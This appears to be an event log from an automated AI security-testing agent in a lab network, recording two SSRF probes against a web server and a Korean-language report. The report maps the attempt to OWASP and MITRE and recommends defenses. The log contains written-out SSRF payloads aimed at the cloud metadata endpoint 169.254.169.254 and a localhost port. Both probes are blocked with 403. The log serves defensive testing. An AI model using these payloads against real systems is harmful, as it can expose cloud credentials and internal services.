@@ -1,0 +1,42 @@
+{"event": "stage", "stage": "planning"}
+{"event": "lookup_decision", "decision": "new", "playbook_id": "", "confidence": 0, "reason": "강제 new — 최고 후보도 sim=0.098 < 0.7"}
+{"event": "stage", "stage": "planning"}
+{"event": "stage", "stage": "executing"}
+{"event": "precheck_fail", "skill": "shell", "message": "10.20.30.1 unreachable"}
+{"event": "skill_start", "skill": "http_request", "params": {"method": "GET", "url": "http://10.20.32.80/?q=http://169.254.169.254/latest/meta-data/", "target": "10.20.30.201", "headers": {}, "body": "", "host": "10.20.30.201"}, "attempt": 1}
+{"event": "skill_result", "skill": "http_request", "success": true, "output": "HTTP_CODE:403\nSIZE:276\nTIME:0.003357\n--- RESPONSE HEADERS ---\nHTTP/1.1 403 Forbidden\nDate: Mon, 13 Jul 2026 12:59:10 GMT\nServer: Apache/2.4.52 (Ubuntu)\nContent-Length: 276\nContent-Type: text/html; charset=iso-8859-1\n\n--- RESPONSE BODY (head -30) ---\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access this resource.</p>\n<hr>\n<address>Apache/2.4.52 (Ubuntu) Server at 10.20.32.80 Port 80</address>\n</body></html>\n", "attempt": 1}
+{"event": "skill_start", "skill": "http_request", "params": {"body": "", "headers": {}, "method": "GET", "target": "10.20.30.201", "url": "http://10.20.32.80/?q=http://127.0.0.1:9100/", "host": "10.20.30.201"}, "attempt": 1}
+{"event": "skill_result", "skill": "http_request", "success": true, "output": "HTTP_CODE:403\nSIZE:276\nTIME:0.015670\n--- RESPONSE HEADERS ---\nHTTP/1.1 403 Forbidden\nDate: Mon, 13 Jul 2026 12:59:18 GMT\nServer: Apache/2.4.52 (Ubuntu)\nContent-Length: 276\nContent-Type: text/html; charset=iso-8859-1\n\n--- RESPONSE BODY (head -30) ---\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access this resource.</p>\n<hr>\n<address>Apache/2.4.52 (Ubuntu) Server at 10.20.32.80 Port 80</address>\n</body></html>\n", "attempt": 1}
+{"event": "stream_token", "token": "**GOAL** – Verify whether the web server (`el34‑web`, IP 10.20.32.80) is vulnerable to Server‑Side R"}
+{"event": "stream_token", "token": "equest Forgery (SSRF) by attempting two typical payloads (metadata service and localhost management "}
+{"event": "stream_token", "token": "port) from the attacker VM.\n\n---\n\n### ① 실행 결과 (★ 코드블록)\n\n```text\n# 1️⃣ SSRF → http://169.254.169.254/"}
+{"event": "stream_token", "token": "latest/meta-data/\nHTTP_CODE:403\nSIZE:276\nTIME:0.003357\n--- RESPONSE HEADERS ---\nHTTP/1.1 403 Forbidd"}
+{"event": "stream_token", "token": "en\nDate: Mon, 13 Jul 2026 12:59:10 GMT\nServer: Apache/2.4.52 (Ubuntu)\nContent-Length: 276\nContent-Ty"}
+{"event": "stream_token", "token": "pe: text/html; charset=iso-8859-1\n\n--- RESPONSE BODY (head -30) ---\n<!DOCTYPE HTML PUBLIC \"-//IETF//"}
+{"event": "stream_token", "token": "DTD HTML 2.0//EN\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You"}
+{"event": "stream_token", "token": " don't have permission to access this resource.</p>\n<hr>\n<address>Apache/2.4.52 (Ubuntu) Server at 1"}
+{"event": "stream_token", "token": "0.20.32.80 Port 80</address>\n</body></html>\n\n# 2️⃣ SSRF → http://127.0.0.1:9100/\nHTTP_CODE:403\nSIZE:"}
+{"event": "stream_token", "token": "276\nTIME:0.015670\n--- RESPONSE HEADERS ---\nHTTP/1.1 403 Forbidden\nDate: Mon, 13 Jul 2026 12:59:18 GM"}
+{"event": "stream_token", "token": "T\nServer: Apache/2.4.52 (Ubuntu)\nContent-Length: 276\nContent-Type: text/html; charset=iso-8859-1\n\n--"}
+{"event": "stream_token", "token": "- RESPONSE BODY (head -30) ---\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<titl"}
+{"event": "stream_token", "token": "e>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access this"}
+{"event": "stream_token", "token": " resource.</p>\n<hr>\n<address>Apache/2.4.52 (Ubuntu) Server at 10.20.32.80 Port 80</address>\n</body><"}
+{"event": "stream_token", "token": "/html>\n```\n\n---\n\n### ② 취약점/의도 입증  \n\n| Payload | Expected behaviour (if vulnerable) | 실제 응답 | 성공 여부 |"}
+{"event": "stream_token", "token": "\n|---------|-----------------------------------|----------|-----------|\n| `http://169.254.169.254/la"}
+{"event": "stream_token", "token": "test/meta-data/` | 내부 메타데이터 반환 (200 OK, JSON) | 403 Forbidden HTML 페이지 | **X** (차단) |\n| `http://127."}
+{"event": "stream_token", "token": "0.0.1:9100/` | 로컬 관리 서비스 응답 (예: Prometheus metrics) | 403 Forbidden HTML 페이지 | **X** (차단) |\n\n두 시도 모두"}
+{"event": "stream_token", "token": " **HTTP 403**을 반환하여 SSRF가 차단되었습니다.\n\n---\n\n### ③ 정량 수치  \n\n- 총 시도 횟수: **2**\n- 차단된 요청: **2 / 2 (100 %)**"}
+{"event": "stream_token", "token": "\n- 평균 응답 시간: **≈ 0.0095 s**\n- HTTP 상태 코드 분포: `403 × 2`\n\n---\n\n### ④ 표준 매핑  \n\n| 標準 | 매핑 |\n|------|----"}
+{"event": "stream_token", "token": "--|\n| OWASP Top‑10 | **A10 – Server‑Side Request Forgery** |\n| MITRE ATT&CK | **T1190 – Exploit Publ"}
+{"event": "stream_token", "token": "ic‑Facing Application** (SSRF technique) |\n| ModSecurity Rule (예시) | `950006` – “Inbound request con"}
+{"event": "stream_token", "token": "tains internal IP address” |\n\n---\n\n### ⑤ 결론·권고  \n\n1. **현재 상태** – 웹 서버는 요청된 내부 주소에 대해 403 Forbidden을 "}
+{"event": "stream_token", "token": "반환하며, SSRF 시도가 차단되었습니다.  \n2. **추가 방어 강화**  \n   - ModSecurity 규칙 `950006` (또는 최신 OWASP CRS) 를 활성화하여 *"}
+{"event": "stream_token", "token": "*내부 IP/메타데이터 URL** 패턴을 즉시 차단하도록 설정합니다.  \n   - outbound HTTP 요청을 **프록시(eg. Squid) 또는 egress firewall*"}
+{"event": "stream_token", "token": "* 로 제한하고, 허용된 도메인·IP만 통신 가능하게 합니다.  \n   - 애플리케이션 레벨에서 **URL 파라미터 검증** (화이트리스트 방식) 및 **스키마/호스트 검증**을 "}
+{"event": "stream_token", "token": "구현합니다.  \n3. **모니터링** – Wazuh SIEM에 `ssrf` 관련 이벤트(HTTP 403, 내부 IP 시도)를アラート 룰으로 추가하고, 일일 요약 리포트를 확인하십시"}
+{"event": "stream_token", "token": "오.  \n\n---\n\n### ⑥ 한계·인지  \n\n- 테스트는 단순 GET 요청만 수행했으며, **POST/JSON‑body** 기반 SSRF 혹은 **DNS‑rebinding** 등"}
+{"event": "stream_token", "token": " 다른 변형을 검증하지 않았습니다.  \n- 차단이 403 Forbidden으로 나타났지만, 실제 방어 메커니즘(ModSecurity vs. Apache 설정) 구분이 필요합니다. "}
+{"event": "stream_token", "token": "추가 로그(`/var/log/apache2/error.log`·ModSecurity audit log) 분석을 통해 정확한 룰 출처를 파악하는 것이 권고됩니다.  \n\n**GOAL "}
+{"event": "stream_token", "token": "충족됨:** SSRF 시도에 대한 차단 여부를 확인하고, 방어 현황과 향후 강화 조치를 제시했습니다."}
+{"event": "stage", "stage": "validating"}
+{"event": "kg_status", "context": {"used": true, "hits": 5, "took_ms": 41, "skip_reason": "", "error": ""}, "record": {"attempted": true, "success": true, "anchor_id": "anc-baf916f91baa", "dedup": false, "error": ""}}
